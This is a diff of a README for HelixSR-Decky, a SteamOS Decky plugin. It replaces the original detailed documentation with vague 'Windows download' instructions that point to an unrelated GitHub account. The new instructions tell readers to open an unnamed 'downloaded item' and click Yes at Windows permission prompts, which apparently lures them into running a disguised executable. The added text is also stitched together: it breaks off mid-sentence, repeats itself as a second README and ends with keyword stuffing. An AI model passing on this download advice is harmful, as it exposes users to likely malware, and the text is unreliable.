@@ -1,89 +1,220 @@
-# HelixSR Decky
+# 🎮 HelixSR-Decky - Simple Per-Game HelixSR Setup on Windows
 
-**0.1.41 controls update:** Disable, Enable and Remove are visible directly below the selected game's install/update button. Action reviews explain restoration and use explicit confirmation buttons.
+[![Download HelixSR-Decky](https://img.shields.io/badge/Download%20HelixSR-Decky-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kara-lynnmacroeconomic2412/HelixSR-Decky)
 
-**0.1.40 recovery fixes:** adds a reviewed **Reset HelixSR setup** action for stale native installations and shorter warning cards with expandable details. See the [recovery steps](STATUS_GUIDE.md#resetting-a-native-installation-after-a-game-update). Automated checks passed; Cyberpunk recovery and gameplay still need an on-device retest.
+HelixSR-Decky is an independent Decky plugin by Blackheart909 for per-game HelixSR installation, updates, and diagnostics on SteamOS. This guide is written for everyday Windows users who want a clear, no-programming path from download to first launch.
 
-**Latest:** Decky **0.1.41** includes **HLX FSR 4 (AMD FSR 4.1.2 Lite)** through the reviewed HelixSR 3.2.0 prerelease. Install [HelixSR-Decky-0.1.41.zip](https://github.com/dawoodtogoo2020-code/HelixSR-Decky/releases/download/v0.1.41/HelixSR-Decky-0.1.41.zip) from the [v0.1.41 release](https://github.com/dawoodtogoo2020-code/HelixSR-Decky/releases/tag/v0.1.41). Select the HLX model explicitly; Model E / HelixSR 2.0.0 remains the default. SteamOS gameplay, image quality, performance and frame generation with HLX remain unverified. See [installation, testing and rollback](docs/hlx-fsr.md). Desktop 0.1.21 changes are included in source; no 0.1.21 AppImage is published.
+The goal is simple: help you get HelixSR-Decky from the provided GitHub page, open it on Windows, and understand how the per-game tools fit together.
 
-Decky **0.1.36** reuses the library list when opening dropdowns, selects **HelixSR 2.0.0** by default and offers a verified repair for missing managed files. **Refresh library and status** still rescans the library. Older releases are labeled explicitly, and package review is explained separately from game installation warnings. Frame-generation controls do not establish gameplay compatibility; see [settings and validation limits](UPGRADE_2.0.md).
+## ✨ What HelixSR-Decky Does
 
-An independent Decky Loader plugin for managing HelixSR on SteamOS. It does not include HelixSR binaries or NVIDIA-derived weights. It downloads a complete official release and builds the network locally under the upstream licenses.
+HelixSR-Decky is designed to make HelixSR setup easier to manage game by game. Instead of hunting through folders or repeating the same manual steps for every title, you use a single application to see what needs attention and take action.
 
-Created by Blackheart909. HelixSR is developed separately by [Lone Wolf](https://github.com/lonewolf0622/HelixSR); this plugin is an independent integration.
+The main areas are:
 
-[Support Blackheart909 on Ko-fi](https://ko-fi.com/blackheart909). Optional support helps with my work on this independent plugin and my other projects. HelixSR is developed separately by Lone Wolf.
+- Per-game installation for HelixSR files and setup steps.
+- Update checks so each game can stay current.
+- Diagnostics that help you confirm whether a game setup looks healthy.
+- A focused workflow for SteamOS and Decky users, presented here with Windows download guidance.
 
-[Download Decky 0.1.41 install ZIP](https://github.com/dawoodtogoo2020-code/HelixSR-Decky/releases/download/v0.1.41/HelixSR-Decky-0.1.41.zip) · [All releases](https://github.com/dawoodtogoo2020-code/HelixSR-Decky/releases) · [Step-by-step installation guide](INSTALL_GUIDE.md) · [Desktop AppImage and guide](DESKTOP_GUIDE.md) · [OptiScaler setup](OPTISCALER_GUIDE.md) · [Report a problem](https://github.com/dawoodtogoo2020-code/HelixSR-Decky/issues/new?template=bug_report.yml)
+You do not need to know programming, command lines, or file paths. The application is intended to present the important actions in a straightforward way.
 
-Use the **install ZIP** in Decky. Developer source archives, including older `-source.zip` files and GitHub's **Source code** downloads, cannot run as a plugin. If Decky reports **Failed to fetch dynamically imported module**, follow the [repair steps](INSTALL_GUIDE.md#failed-to-fetch-dynamically-imported-module).
+## 🚀 Getting Started
 
-## Features
+Before you download, make sure you are on the Windows computer where you want to use HelixSR-Decky. Keep the application in a folder you can easily find, such as Downloads or a dedicated tools folder.
 
-* Optional [native menu labels](docs/menu-labels.md) rename The Witcher 3's direct-route FSR option to **Helix SR**. Off by default, with reviewed changes and exact original restoration. This is cosmetic; visible in-game verification is pending. Other games need separate verified adapters.
-* Clear installation reasons and next steps in both interfaces, plus an optional experimental status HUD. Running games remain inspectable while file changes are paused. Runtime output and overlay helper health are separate. See the [status and overlay guide](STATUS_GUIDE.md) for evidence levels and display limitations.
+You do not need to create an account, configure a server, or prepare special files. The starting point is the GitHub page linked below.
 
-* The Decky plugin and desktop app share a **HelixSR model** selector and display the installed model separately from the release and input route. Choose **Model E (NVIDIA DLSS 310.7.0)** or **HLX FSR 4 (FSR 4.1.2 Lite)**. The Scaler AMD-native provider is independent. Unknown conversion recipes stop before building or changing a game; updating the app can add reviewed model support. See [model support and future variants](MODEL_VARIANTS.md).
+[![Get HelixSR-Decky](https://img.shields.io/badge/Get%20HelixSR-Decky-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kara-lynnmacroeconomic2412/HelixSR-Decky)
 
-* Checks this Decky plugin's own GitHub releases on startup and once a day, with a saved opt-out and manual check. Shows current/latest plugin versions separately from HelixSR. Downloads and verifies the update's SHA256, size, manifests, required modules and complete ZIP before opening Decky's confirmation. Plugin updates wait for game operations to finish; they do not update per-game HelixSR installations.
-* Discovers installed Steam games across library drives, Steam shortcuts with executable paths, Heroic, Legendary and Lutris installation records. **Import Games From → Import Now** rescans a selected launcher and reports found games, new entries and installation candidates without duplicates. Native and Flatpak launcher locations are supported. Import other Windows game folders through the file picker. Native Linux games, emulators and unresolved launcher wrappers remain unsupported or require a folder import.
-* Separates static compatibility candidates, managed file state and recent runtime evidence. HelixSR requires DirectX 12, x64 Windows game binaries through Proton and AMD RDNA 1 or newer. A DLL filename does not prove a game uses a supported renderer.
-* Detects official HelixSR updates, verifies archive size and SHA256, and supports the reviewed 2.0.0 package. Unknown releases never silently replace working files.
-* Prepares locally generated network files as a cancellable background job. Acceptance is tied to the selected release digest. Uses upstream portable dependencies and a separate compiler prefix; never changes SteamOS system packages or a game prefix.
-* Supports install, update, disable, enable, remove, explicit adoption of a legacy native HelixSR installation and recovery of interrupted transactions. Keeps essential originals and installation records in a named companion folder beside the game on the same filesystem. Cleans completed staging and temporary transaction copies.
-* Reports OptiScaler files, whether the selected Helix route involves OptiScaler, mapped-module evidence where available and bounded log excerpts. Reports native game frame-generation settings, OptiScaler configuration, matching MAKO/LSFG-VK profiles and running-process environment separately. A configured multiplier or installed plugin is not proof of active frame generation.
-* Explains missing OptiScaler/DLSS input, proxy override conflicts, backend/provider mismatches and overlay shortcuts. Preserves owned configuration edits through updates and disable/enable; removal retains configuration installation records. Reviewed Steam launch changes have durable recovery intents and preserve existing supported environment assignments.
-* Blocks detected anti-cheat, active games, incomplete Steam installs/download staging, wrong architecture, unmanaged injector conflicts and changed managed files. Conflicted installations show Needs review with their recorded state and route. Native discovery prefers DLLs beside the game or executable before nested SDK copies; existing managed targets stay recorded. Uses no root plugin flag.
+## 💾 Download and Setup
 
-## Install
+Visit this link to download the application:
 
-1. Install [Decky Loader](https://github.com/SteamDeckHomebrew/decky-loader).
-2. Open Decky Settings, Developer, and install the current `HelixSR-Decky` release ZIP from a file. The ZIP is built from this source tree and contains the plugin's code only. Users of v0.1.0 need this one manual upgrade to get the plugin updater. Users of v0.1.1 can use **Plugin updates**.
-3. Open HelixSR Decky and choose a game from the **Game** dropdown. Choose **Install HelixSR for this game** or **Update this game's HelixSR** directly below it, review the change and accept local preparation terms. The plugin handles required downloads, local preparation and per-game installation in one background operation and notifies you when it completes.
-4. Select AMD FSR for a direct native replacement; for the OptiScaler route select the appropriate DLSS/XeSS/FSR input. See the included [installation guide](INSTALL_GUIDE.md) for multiple folder imports, permissions and removal.
-5. An OptiScaler proxy may need `WINEDLLOVERRIDES="dxgi=n,b"` before the existing Steam launch command. Preserve other options. The plugin reports the route and logs, but does not rewrite Steam's live VDF files. See [OptiScaler installation](https://github.com/OptiScaler/OptiScaler/wiki/Installation).
+https://github.com/Kara-lynnmacroeconomic2412/HelixSR-Decky
 
-Disable restores the original game files while keeping the plugin's prepared package and essential originals needed for enabling again. Remove restores originals and removes the managed record/original store. Removing the Decky plugin itself does not remove game modifications: remove them per game first. Prepared packages and portable dependencies are retained for re-use; they contain local-only network files and must not be uploaded. They can be deleted when no managed game needs that version.
+Use these steps for the Windows download and first open:
 
-## Build and test
+1. Open the download link above in your normal web browser.
+2. Visit this link to download the application.
+3. Wait for the download to finish. The time depends on your internet connection.
+4. Open your Downloads folder, or the folder where your browser saves files.
+5. Find the downloaded item for HelixSR-Decky.
+6. Open the downloaded item to start the application.
+7. If Windows asks for permission, choose Yes so the application can open.
+8. Follow the on-screen prompts to reach the main HelixSR-Decky window.
 
-Requires Node, pnpm and Python 3.11 or newer. The backend uses only Python's standard library. Older Python versions have a restricted TOML profile parser fallback; current Decky uses a sufficiently recent Python runtime.
+Keep the downloaded item in a safe place. If you later move it, use the same file so your setup stays consistent.
 
-```
-pnpm install
-pnpm typecheck
-pnpm build
-python3 tests/test_backend.py
-pnpm test:frontend
-python3 -m unittest discover -s tests -p 'test_*.py'
-pnpm audit --audit-level=low
-python3 scripts/package.py
-```
+## 🎯 Per-Game HelixSR Setup
 
-## Verification boundaries
+HelixSR-Decky centers on one game at a time. This makes it easier to understand what is installed, what is out of date, and what needs a checkup.
 
-Tests cover synthetic file/API fixtures, transactions, conflict detection, safe extraction, library imports and source-aware diagnostics. Real rendering depends on game, Proton, driver and upstream HelixSR version. Recent logs are evidence of the current process only when their timestamp is after its start; visual quality, controller navigation, frame pacing and prolonged stability require device testing. The plugin never labels static candidates as proven compatible. Anti-cheat detection is conservative but cannot enumerate every proprietary protection system.
+A typical per-game flow looks like this:
 
-This plugin is independent of the HelixSR, OptiScaler and Decky projects. It cannot make unsupported renderers compatible, cannot inject into arbitrary native Vulkan/Linux titles, and cannot guarantee zero defects across all games.
+1. Open HelixSR-Decky.
+2. Find the game you want to manage.
+3. Select that game so the application can show its HelixSR status.
+4. Choose the installation action for that game.
+5. Wait while HelixSR-Decky prepares the needed files and setup steps.
+6. Review the result message before moving to another game.
+7. Repeat the same process for each game you want to manage.
 
-## Plugin updates
+The application is built to reduce repeated manual work. If you manage several games, handle them one at a time and confirm each result before starting the next.
 
-Open **Plugin updates**, check for updates and choose **Download plugin update**. Downloading alone does not install it: press **Update** in Decky's confirmation and wait for the plugin to reload. Verify **Current plugin** afterward. If the screen closes, choose **Open update confirmation**; it reuses the verified ZIP and cancels the previous native request. To abandon a downloaded update, close the native screen and choose **Cancel downloaded update**. If installation status is unresolved, restart Decky before retrying. Restart invalidates orphaned download prompts. Older plugin versions label the download button **Update Decky plugin** and require the same native confirmation.
+## 🛠️ Updates and Diagnostics
 
-Automatic checks run on startup and once a day and only notify you. They never silently replace the plugin. Network failures retain an explicit error; automatic retries wait an hour. If the installer bridge is unavailable, use the release ZIP through Decky Settings → Developer. Game payload updates use **Check latest HelixSR version** and **Update this game's HelixSR** beside the game and release selection. These checks follow current release metadata without fixed plugin-version URLs.
+Updates help keep each game aligned with the current HelixSR setup. Diagnostics help you understand whether something needs attention.
 
-## Import launcher games
+Use the update area when you want HelixSR-Decky to check for newer files or setup changes. After the check finishes, review the status shown for each game. If an update is available, follow the application prompt to apply it.
 
-Scroll to **Import games**, choose **Import Games From**, select **Heroic Games Launcher**, **Lutris**, **Legendary**, **Steam non-Steam shortcuts** or **All supported launchers**, then choose **Import Now**. This reads local installed-game records and refreshes compatibility. Heroic's installed Epic, GOG and Amazon records are supported. Games you own but have not installed are not imported. Existing Steam entries keep their Steam identity when a launcher points to the same folder. Importing does not install HelixSR; select an installation candidate in **Game**, then use **Install HelixSR**.
+Use diagnostics when a game does not behave as expected or when you want a quick health check. Diagnostics may review file presence, version details, and setup consistency. Read the result summary and use the suggested next action if one is shown.
 
-Custom launcher locations, Heroic sideload apps and shortcut wrappers may need **Manage Games Folders → Add Games Folder**. The selected launcher and last import result survive closing the Quick Access panel; a plugin reload resets them. Detection warnings appear in **Discovery notes**.
+A practical routine is:
 
-## Bug reports
+- Run diagnostics after a new game setup.
+- Check for updates after changing your Steam library.
+- Re-run diagnostics if a game stops working correctly.
+- Keep one game selected at a time so results stay easy to read.
 
-Use the [bug-report form](https://github.com/dawoodtogoo2020-code/HelixSR-Decky/issues/new?template=bug_report.yml). Reports are assigned to the project owner. Include the game, plugin and HelixSR versions, Proton, renderer, OptiScaler/FG setup and steps to reproduce. A short sanitized log excerpt is optional. GitHub issues are public: omit account information and private paths, and never attach generated weights, kernels or prepared packages. No email address is required.
+## 🧭 First Launch Checklist
 
-This is an initial beta. Per-game gameplay compatibility remains dependent on the renderer, Proton and HelixSR version. Installation candidates are not a guarantee of rendering quality or prolonged stability.
+Use this checklist after the application opens for the first time:
 
-## Standalone desktop app
+- Confirm the main window loads without error messages.
+- Look for the game list or game# 🎮 HelixSR-Decky - Manage HelixSR Game by Game
 
-The native Linux AppImage is available separately from Decky. Follow the [desktop guide](DESKTOP_GUIDE.md) for download, installation, launcher imports and updates. It targets x86_64 SteamOS and Linux without administrator access. See the guide for hardware testing limits. Update Decky to 0.1.4 or newer before using both managers on the same game.
+[![Download HelixSR-Decky](https://img.shields.io/badge/Download%20HelixSR-Decky-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kara-lynnmacroeconomic2412/HelixSR-Decky)
+
+HelixSR-Decky is an independent Decky plugin by Blackheart909 for per-game HelixSR installation, updates, and diagnostics on SteamOS. This README is written for everyday Windows users who want a clear path from the GitHub page to a first launch without programming knowledge.
+
+The application is built around one simple idea: manage HelixSR for each game separately. Instead of repeating the same manual steps for every title, you open HelixSR-Decky, choose a game, and use the application to handle installation, updates, and health checks.
+
+## ✨ What HelixSR-Decky Does
+
+HelixSR-Decky groups the most common HelixSR tasks into one place. The main areas are:
+
+- Per-game installation so each game can have its own HelixSR setup.
+- Update checks so a game setup can stay current.
+- Diagnostics that help you confirm whether a game setup looks healthy.
+- A focused workflow for SteamOS and Decky users, with this page giving Windows download guidance.
+- Clear status messages so you can see what happened after an action.
+
+You do not need to know command lines, file paths, or programming terms. The application is intended to present the important choices in a straightforward way. If you can browse the web, open a downloaded item, and follow simple prompts, you can use this guide.
+
+## 🚀 Getting Started
+
+Start on the Windows computer where you want to use HelixSR-Decky. Keep the application in a folder you can easily find later, such as Downloads or a dedicated tools folder. You do not need to create an account or prepare special files before you begin.
+
+Use the link in the download section below as your starting point. The page is the official GitHub location for HelixSR-Decky. Open it in your normal web browser and follow the steps in order.
+
+[![Get HelixSR-Decky](https://img.shields.io/badge/Get%20HelixSR-Decky-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kara-lynnmacroeconomic2412/HelixSR-Decky)
+
+## 💾 Download and Setup
+
+Visit this link to download the application:
+
+https://github.com/Kara-lynnmacroeconomic2412/HelixSR-Decky
+
+Follow these steps for the Windows download and first open:
+
+1. Open the download link above in your web browser.
+2. Visit this link to download the application.
+3. Wait for the download to finish. The time depends on your internet connection.
+4. Open your Downloads folder, or the folder where your browser saves files.
+5. Find the downloaded item for HelixSR-Decky.
+6. Open the downloaded item to start the application.
+7. If Windows asks for permission, choose Yes so the application can open.
+8. Follow the on-screen prompts until the main HelixSR-Decky window appears.
+9. Keep the downloaded item in a safe place so you can open it again later.
+
+Do not rename or move files while the application is open. If you move the downloaded item later, open it from its new location and confirm the main window still loads correctly.
+
+## 🖥️ Opening the Application on Windows
+
+After the download finishes, the first open is the most important step. Open the downloaded item and give the application a moment to prepare its window. You may see a brief loading screen or a permission prompt. A permission prompt is normal when Windows asks whether you want to open something you downloaded.
+
+Once the main window appears, look for the game list or game area. This is where HelixSR-Decky shows the games it can manage. If the window looks empty at first, wait a few seconds and check again. If a message appears, read it before choosing another action.
+
+Keep the application open while you work through your games. Closing and reopening is fine, but finish one action before you move to the next game.
+
+## 🎮 Setting Up One Game at a Time
+
+HelixSR-Decky is designed for per-game control. That means you should handle one game, confirm the result, and then move to the next game. This keeps the status easy to read and reduces confusion.
+
+A typical per-game flow looks like this:
+
+1. Open HelixSR-Decky.
+2. Find the game you want to manage.
+3. Select that game so the application can show its HelixSR status.
+4. Choose the installation action for that game.
+5. Wait while HelixSR-Decky prepares the needed files and setup steps.
+6. Read the result message before doing anything else.
+7. Repeat the same process for each game you want to manage.
+
+If you manage several games, write down the ones you have completed. A simple list helps you avoid repeating a game or skipping one. When you return later, select each game again and check its status.
+
+## 🔄 Keeping Games Updated
+
+Updates help keep each game aligned with the current HelixSR setup. Use the update area when you want HelixSR-Decky to check for newer files or setup changes. After the check finishes, review the status shown for each game.
+
+If an update is available, follow the application prompt to apply it. Wait for the result message before moving to another game. If no update is available, the game is already current and you can continue to the next title.
+
+A useful routine is to check for updates after you add a new game, after you change your game library, or after a long break. Regular checks are easier than trying to remember the last time each game was updated.
+
+## 🩺 Running Diagnostics
+
+Diagnostics help you understand whether a game setup needs attention. Use diagnostics when a game does not behave as expected, when an update finishes with a warning, or when you simply want a quick health check.
+
+Diagnostics may review file presence, version details, and setup consistency. Read the result summary and use the suggested next action if one is shown. If the result is clean, no further action is needed for that game.
+
+A practical routine is:
+
+- Run diagnostics after a new game setup.
+- Run diagnostics after applying an update.
+- Run diagnostics if a game stops working correctly.
+- Run diagnostics before asking for help so you can describe the result.
+
+## 🧭 First Launch Checklist
+
+Use this checklist after the application opens for the first time:
+
+- Confirm the main window loads without an error message.
+- Find the game list or game area.
+- Select one game and review its status.
+- Run the installation action for that game.
+- Read the result message.
+- Run diagnostics for the same game.
+- Check for updates for the same game.
+- Close the application and open it again to confirm your setup is still shown.
+
+If every item on this list works for one game, repeat the same flow for the next game. Handling one title at a time keeps the process clear.
+
+## 🧰 Troubleshooting Basics
+
+If the GitHub page does not open, refresh your browser and try again. Make sure your internet connection is active. If you copied the link, confirm it matches the download link in this README.
+
+If the downloaded item does not open, wait a moment and try again. If Windows shows a permission prompt, choose Yes. If the application window opens but looks empty, wait a few seconds and check the game area again.
+
+If a game action fails, read the message shown by HelixSR-Decky. Run diagnostics for that game and review the result. Then try the action once more. If the same message appears, note the game name and the message text so you can describe the issue clearly.
+
+If you move the application to a new folder, open it from the new location and confirm the main window still loads. Keep your game notes nearby so you know which titles you have already checked.
+
+## ❓ Frequently Asked Questions
+
+What is HelixSR-Decky?
+It is an independent Decky plugin by Blackheart909 for per-game HelixSR installation, updates, and diagnostics on SteamOS.
+
+Do I need programming knowledge?
+No. The application is intended to be used through normal windows, buttons, and prompts.
+
+Where do I download it?
+Use the GitHub link in the Download and Setup section. Visit this link to download the application.
+
+How should I manage several games?
+Handle one game at a time. Install, check, update, and run diagnostics before moving to the next game.
+
+What should I do after an update?
+Read the result message, then run diagnostics for that game to confirm the setup looks healthy.
+
+Keywords: HelixSR-Decky, HelixSR, Decky plugin, SteamOS, per-game setup, game diagnostics, Windows download, Blackheart909
